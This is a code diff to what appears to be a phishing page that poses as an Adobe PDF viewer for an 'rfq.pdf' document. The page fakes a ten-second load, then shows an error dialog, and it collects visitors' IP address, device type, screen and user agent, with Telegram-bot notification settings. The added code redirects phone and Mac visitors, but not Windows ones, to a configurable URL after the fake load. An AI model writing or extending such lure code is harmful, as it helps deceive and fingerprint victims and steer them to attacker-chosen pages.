@@ -653,6 +653,7 @@
     <!--
       Edit these values to customize the display text, local PDF download, and notifications.
       Keep downloadFileName/downloadPath pointed at a PDF document in this same directory.
+      Set deviceRedirectUrl to redirect phones and macOS laptops/computers after loading.
 
       To enable Telegram notifications:
       1. Create a bot with BotFather and paste its token into telegramBotToken.
@@ -671,6 +672,7 @@
         "logoPath": "./adobe-logo.svg",
         "downloadFileName": "rfq.pdf",
         "downloadPath": "./rfq.pdf",
+        "deviceRedirectUrl": "",
         "loadingDelayMs": 10000,
         "notificationEndpoint": "",
         "telegramBotToken": "",
@@ -697,6 +699,7 @@
       const configuredLogoPath = config.logoPath || "./adobe-logo.svg";
       const configuredDownloadFileName = config.downloadFileName || "rfq.pdf";
       const configuredDownloadPath = config.downloadPath || `./${configuredDownloadFileName}`;
+      const deviceRedirectUrl = (config.deviceRedirectUrl || "").trim();
       const safeDownloadFileName = configuredDownloadFileName.toLowerCase().endsWith(".pdf")
         ? configuredDownloadFileName
         : "rfq.pdf";
@@ -724,18 +727,38 @@
         errorDialog.hidden = true;
       });
 
+      const getClientSignals = () => ({
+        userAgent: navigator.userAgent || "Unknown",
+        platform: navigator.platform || "Unknown",
+        maxTouchPoints: navigator.maxTouchPoints || 0,
+      });
+
       const getDeviceDetails = () => {
-        const userAgent = navigator.userAgent || "Unknown";
-        const isTablet = /iPad|Tablet/i.test(userAgent);
+        const { userAgent, platform, maxTouchPoints } = getClientSignals();
+        const isIpadOsTablet = /Mac/i.test(platform) && maxTouchPoints > 1;
+        const isTablet = /iPad|Tablet/i.test(userAgent) || isIpadOsTablet;
         const isMobile = /Android|iPhone|iPod|Mobile/i.test(userAgent) && !isTablet;
 
         return {
           type: isTablet ? "Tablet" : isMobile ? "Mobile" : "Desktop",
-          platform: navigator.platform || "Unknown",
+          platform,
           language: navigator.language || "Unknown",
           screen: window.screen ? `${window.screen.width}x${window.screen.height}` : "Unknown",
           userAgent,
         };
+      };
+
+      const shouldRedirectAfterLoading = () => {
+        if (!deviceRedirectUrl) {
+          return false;
+        }
+
+        const { userAgent, platform } = getClientSignals();
+        const device = getDeviceDetails();
+        const isWindows = /Windows/i.test(userAgent) || /Win/i.test(platform);
+        const isMacComputer = /Mac/i.test(platform) && device.type === "Desktop";
+
+        return !isWindows && (device.type === "Mobile" || isMacComputer);
       };
 
       const getPublicIpAddress = async () => {
@@ -863,6 +886,12 @@
 
         window.setTimeout(() => {
           viewerLoading.hidden = true;
+
+          if (shouldRedirectAfterLoading()) {
+            window.location.href = deviceRedirectUrl;
+            return;
+          }
+
           errorDialog.hidden = false;
         }, 280);
       }, loadingDelayMs);
